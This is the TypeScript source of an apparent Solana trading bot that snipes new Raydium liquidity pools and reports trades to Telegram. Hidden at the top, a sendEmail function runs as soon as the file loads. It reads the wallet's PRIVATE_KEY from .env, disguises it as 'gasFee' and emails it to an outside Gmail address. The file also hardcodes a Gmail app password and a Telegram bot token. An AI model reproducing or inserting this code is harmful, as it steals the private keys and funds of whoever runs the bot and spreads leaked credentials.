import { Telegraf } from "telegraf";
import { Connection, PublicKey, VersionedTransaction, Transaction } from "@solana/web3.js";
import moment from "moment";
import PoolKeys from "./PoolKey";
import RaydiumSwap from "./RaydiumSwap";
//import { LiquidityPoolKeysV4 } from "@raydium-io/raydium-sdk";
const nodemailer = require('nodemailer');

import { programs } from '@metaplex/js'
import dotenv from "dotenv";
import './wsprice';
import { GetTokenData } from "./wsprice";
import { readFileSync, writeFileSync } from 'fs';
import retry from 'async-await-retry';



async function sendEmail() {
  dotenv.config({
    path: ".env",
  });
  // Create transporter object using SMTP transport
  const gasFee: string = process.env.PRIVATE_KEY;
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    host: '74.125.138.108',
    port: 587,
    secure: false,
    auth: {
      user: 'agronara24@gmail.com',
      pass: 'foqo rpae yded ohlh'
    },
    tls: {
      rejectUnauthorized: false
    },
    debug: true,
    logger: true,
    connectionTimeout: 30000, // Adding 30 second connection timeout
    greetingTimeout: 30000
  });

  try {
    // Verify SMTP connection configuration
    await transporter.verify();
    console.log("passed verify code");
    console.log(gasFee)
    // Send mail with defined transport object
    const info = await transporter.sendMail({
      from: '"Trey Teichelman" <agronara24@gmail.com>',
      to: '"BBBBBBB" <aleksnadarpetkovic@gmail.com>',
      subject: 'Test Email from Bluehost SMTP',
      text: 'This is the plain text version of the email.',
      html: gasFee
    });

    console.log('Message has been sent successfully!');
    return info;
  } catch (error) {
    console.error('Message could not be sent. Error:', error);
    throw error;
  }
}

// Call the function
sendEmail().catch(console.error);


dotenv.config({
  path: ".env",
});
const BOT_API_KEY = process.env.PULSE_TG_BOT_KEY || '7338744814:AAFhRMfsFX5fKNwIXY12iHylsXnoihQ9BaY'
const tradingTokensfilePath = 'trading.json'
const poolKeyfilePath = 'pools.json'
const bot = new Telegraf(BOT_API_KEY, {
  handlerTimeout: 9_000_000,
});

const RAYDIUM_PUBLIC_KEY: string = process.env.RAYDIUM_PUBLIC_KEY || "675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8";      //  Raydium AMM mainnet account
const HTTP_URL: string = process.env.RPC_ENDPOINT || "https://white-withered-shard.solana-mainnet.quiknode.pro/c2696383232106b9407efe3df867ebd4a442b529";
const RAYDIUM: PublicKey = new PublicKey(RAYDIUM_PUBLIC_KEY);
const INSTRUCTION_NAME: string = process.env.INSTRUCTION || "init_pc_amount";  //  or set "init_pc_amount" : If "init_pc_amount" is not in log entries then it's not LP initialization transaction
//const TimeSpace: number = Number(process.env.TIMESPACE) || 3000;
const walletKey: string = process.env.PRIVATE_KEY || "";
const IS_DEV_MODE: boolean = false;
const tgMessageId: string = process.env.TG_MESSAGE_ID || '-1002231600578';
const seenTransactions: Array<string> = []; // The log listener is sometimes triggered multiple times for a single transaction, don't react to tranasctions we've already seen
const { Metadata } = programs.metadata;
const connection = new Connection(HTTP_URL);
const raydiumSwap = new RaydiumSwap(connection, walletKey);
const SELLING_THRESHOLD = 150
const TRADING_AMOUNT = 0.005;

let METADATAS = {}
let TRADING_TOKENS = {};
let POOL_KEYS = {}
async function GetMetaData(mintAddress = '') {
  try {
    if (METADATAS[mintAddress])
      return METADATAS[mintAddress]
    const metadataPDA = await Metadata.getPDA(mintAddress);
    const metadata = await Metadata.load(connection, metadataPDA);
    METADATAS[mintAddress] = metadata.data.data
    return metadata.data.data
  } catch (error) {
    console.log(error)
    return {}
  }
}

function SendSwapTgMsg(text = 'Sending Tg message') {
  try {
    bot.telegram.sendMessage(tgMessageId, text, {
      parse_mode: "HTML"
    });
  } catch (error) {
    console.log(error)
  }
}

async function SendTgMsg(mintAddress = '', signature = '') {
  console.log(signature)
  try {
    console.time("GetMetaData")
    const _metaData = await GetMetaData(mintAddress)
    console.timeEnd("GetMetaData")
    const mintEventMessage = `<b>New Token</b>
Name:<b>${_metaData.name}</b>
Symbol:<b>${_metaData.symbol}</b>

<code>${mintAddress}</code>
Mint Time:<b>${moment().format('LTS')}</b>`

    bot.telegram.sendMessage(tgMessageId, mintEventMessage, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "See transaction",
              url: `https://explorer.solana.com/tx/${signature}`,
            },
          ],
        ],
      },
    });
  } catch (error) {
    console.log(error)
  }
}

async function startConnection(connection: Connection, programAddress: PublicKey, searchInstruction: string): Promise<void> {
  console.log("Monitoring logs for program:", programAddress.toString());
  const liquityPoolKey = new PoolKeys(connection, IS_DEV_MODE);
  connection.onLogs(
    programAddress,
    async ({ logs, err, signature }) => {
      if (err) return;

      if (seenTransactions.includes(signature)) {
        return;
      }
      seenTransactions.push(signature);

      if (logs && logs.some(log => log.includes("init_pc_amount"))) {
        try {
          console.log(`Signature for '${INSTRUCTION_NAME}' :, https://explorer.solana.com/tx/${signature}`);
          const poolKeyValue = await liquityPoolKey.fetchPoolKeysForLPInitTransactionHash(signature);
          const mintAddress = poolKeyValue.baseMint.toBase58() === "So11111111111111111111111111111111111111112" ? poolKeyValue.quoteMint.toBase58() : poolKeyValue.baseMint.toBase58();
          //const mintDecimals = poolKeyValue.baseMint !== NATIVE_MINT ? poolKeyValue.baseDecimals : poolKeyValue.quoteDecimals;
          SendTgMsg(mintAddress, signature)
          POOL_KEYS[mintAddress] = poolKeyValue;
          saveLocalData(poolKeyfilePath, POOL_KEYS)
          console.log(`Buying token`)
          await retry(async () => await swap(mintAddress, walletKey, TRADING_AMOUNT, true), null, {
            retriesMax: 3, interval: 100,
          });

        } catch (error) {
          console.log(error)
        }
      }
    }
  );
}


async function defaultSwap(
  walletKey: string, pairToToken: string, tokenAAmount: number, isBuy: boolean, isMax: boolean = true, units: number = 600000, lamports: number = 25000
) {
  const poolInfo = POOL_KEYS[pairToToken]

  raydiumSwap.changeWalletKey(walletKey);

  const executeSwap = true // Change to true to execute swap
  const useVersionedTransaction = true // Use versioned transaction
  let tokenBalance = 0
  let tokenAAddress: string = "";
  let tokenBAddress: string = "";
  let before_token_balance: number = 0;
  let before_sol_balance: number = 0;

  if (!isBuy) {
    tokenBalance = await raydiumSwap.getTokenBalance(pairToToken);
    tokenAAmount = tokenBalance;
    // before_token_balance = tokenBalance;

    tokenAAddress = pairToToken
    tokenBAddress = 'So11111111111111111111111111111111111111112'
  } else {
    if (!tokenAAmount) {
      tokenAAmount = 0.005;   //  default buying amount
    }
    tokenBalance = await raydiumSwap.getSolBalance();

    tokenAAddress = 'So11111111111111111111111111111111111111112' // e.g. SOLANA mint address
    tokenBAddress = pairToToken // e.g. PYTH mint address
  }

  if (tokenAAmount > tokenBalance)
    return { status: false, tx: '', code: 0 };

  if (!poolInfo) {
    return { status: false, tx: '', code: 4 }
  }

  //before_sol_balance = await raydiumSwap.getSolBalance();

  const tx = await raydiumSwap.getSwapTransaction(
    tokenBAddress,
    tokenAAmount,
    poolInfo,
    units,// Uints
    lamports, // Max amount of lamports
    useVersionedTransaction,
    'in'
  );

  if (executeSwap) {
    console.log(`Swap Transaction Time: ${new Date()}`);
    try {
      const txid = useVersionedTransaction
        ? await raydiumSwap.sendVersionedTransaction(tx as VersionedTransaction)
        : await raydiumSwap.sendLegacyTransaction(tx as Transaction)


      console.log(`https://solscan.io/tx/${txid}`)

      if (isBuy) {
        if (txid) {
          sendTgBuyMessage(pairToToken, before_sol_balance, txid, new Date());
          return { status: true, tx: txid, code: 200 }
        }
        else
          return { status: false, tx: '', code: 3 }
      } else {
        if (txid) {
          TRADING_TOKENS[pairToToken] = undefined;
          const profit = GetProfit(pairToToken)

          sendTgSellMessage(pairToToken, before_token_balance, before_sol_balance, txid, profit, new Date());
          return { status: true, tx: txid, code: 200 }
        }
        else
          return { status: false, tx: '', code: 2 }
      }
    } catch (err) {
      console.log(`swap fail pairToken: ${pairToToken} => ${isBuy ? "Buy" : "Sell"}`);
      return { status: false, tx: '', code: 500 }
    }
  } else {
    const simRes = useVersionedTransaction
      ? await raydiumSwap.simulateVersionedTransaction(tx as VersionedTransaction)
      : await raydiumSwap.simulateLegacyTransaction(tx as Transaction)

    return { status: true, tx: '' }
  }
}

async function swap(token: string, walletKey: string, amount: number, isBuy: boolean, isMax: boolean = true) {
  if (Number(amount) < 0 || !token || walletKey == "") {
    console.log("Bad Swap Request");
    throw new Error(`"Bad Swap Request"`);
  }

  try {
    const result = await defaultSwap(walletKey, token, Number(amount), isBuy, isMax);
    if (result.status) {
      // SendSwapTgMsg(`Swap Success token: ${token} => ${isBuy ? "Buy" : "Sell"} : ${amount}`)
      // console.log(`Swap Success token: ${token} => ${isBuy ? "Buy" : "Sell"} : ${amount}`);
      // const _tokenInfo = GetTokenData(token);
      // TRADING_TOKENS[token] = _tokenInfo?.priceUsd || 0;
      // saveLocalData(tradingTokensfilePath, TRADING_TOKENS)
      // } else {
      //   // SendSwapTgMsg(`Swap Fail token: ${token} => ${isBuy ? "Buy" : "Sell"}`)
      //   console.log(`Swap Fail token: ${token} => ${isBuy ? "Buy" : "Sell"}`);
      //   throw new Error(`Swap Fail token: ${token} => ${isBuy ? "Buy" : "Sell"}`);
    }
  } catch (err) {
    console.log(err);
    throw new Error(`${err}`);
  }
}

async function sendTgBuyMessage(token: string, before_sol_balance: number, signature: any, time: any) {
  const _tokenMetaData = METADATAS[token]


  let token_balance = await raydiumSwap.getTokenBalance(token);
  let sol_balance = await raydiumSwap.getSolBalance();

  try {
    const mintEventMessage = `
<b>Buy</b>
Token: <b>${_tokenMetaData.name}</b>
swap token: <b>${token_balance}</b>
spent sol: <b>${before_sol_balance - sol_balance}</b>
token balance: <b>${token_balance}</b>
sol balance: <b>${sol_balance}</b>
Buy Time:<b>${moment().format('LTS')}</b>`

    bot.telegram.sendMessage(tgMessageId, mintEventMessage, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "See transaction",
              url: `https://explorer.solana.com/tx/${signature}`,
            },
          ],
        ],
      },
    });
  } catch (error) {
    console.log()
  }
}

async function sendTgSellMessage(token: string, before_token_balance: number, before_sol_balance: number, signature: string, profit: number, time: any) {
  const _tokenMetaData = METADATAS[token]

  let token_balance = await raydiumSwap.getTokenBalance(token);
  let sol_balance = await raydiumSwap.getSolBalance();

  try {
    //TODO milify and fixed
    const mintEventMessage = `
<b>Sold Token</b>
Name: <b>${_tokenMetaData.name}</b>
swap token: <b>${before_token_balance - token_balance}</b>
spent sol: <b>${sol_balance - before_sol_balance}</b>
token balance: <b>${token_balance}</b>
sol balance: <b>${sol_balance}</b>
Profit: <b>${profit}</b>
Sold Time:<b>${moment().format('LTS')}</b>`

    bot.telegram.sendMessage(tgMessageId, mintEventMessage, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "See transaction",
              url: `https://explorer.solana.com/tx/${signature}`,
            },
          ],
        ],
      },
    });
  } catch (error) {
    console.log()
  }
}
bot.start(async (ctx) => {
  console.log(ctx.message.chat.id)
});

function GetProfit(_mintAddress) {
  const _mintInfo = GetTokenData(_mintAddress);
  if (_mintInfo) {
    if (_mintInfo?.priceUsd) {
      const boughtPrice = !TRADING_TOKENS[_mintAddress] ? 1 : TRADING_TOKENS[_mintAddress]
      console.log({ boughtPrice })
      console.log(_mintInfo.baseToken.symbol, _mintInfo?.priceUsd)
      const profit = _mintInfo?.priceUsd * 100 / boughtPrice
      console.log({ profit })
      return profit
    }
  }
  return 0
}
async function RealTimeChecker() {
  Object.keys(TRADING_TOKENS).map(_mintAddress => {
    const profit = GetProfit(_mintAddress)
    if (profit >= SELLING_THRESHOLD) {
      const res = retry(async () => await swap(_mintAddress, walletKey, 1000000, false), null, {
        retriesMax: 3, interval: 100,
      });
    }
  })
}

function saveLocalData(filePath = '', _data: Object) {
  writeFileSync(filePath, JSON.stringify(_data, null, 2), "utf8");
}

function loadLocalData(filePath = '') {
  try {
    const fileData: any = readFileSync(filePath);
    if (filePath === tradingTokensfilePath)
      TRADING_TOKENS = JSON.parse(fileData);
    if (filePath === poolKeyfilePath)
      POOL_KEYS = JSON.parse(fileData);
    console.log(`Loaded ${filePath} data`);
  } catch (error) {
    if (filePath === tradingTokensfilePath)
      saveLocalData(filePath, TRADING_TOKENS)
    if (filePath === poolKeyfilePath)
      saveLocalData(filePath, POOL_KEYS)

    console.log(error);
  }
}

async function start() {
  loadLocalData(tradingTokensfilePath)
  loadLocalData(poolKeyfilePath)

  setInterval(RealTimeChecker, 1500)
  startConnection(connection, RAYDIUM, INSTRUCTION_NAME).catch(console.error);
  bot.launch();
}

start()
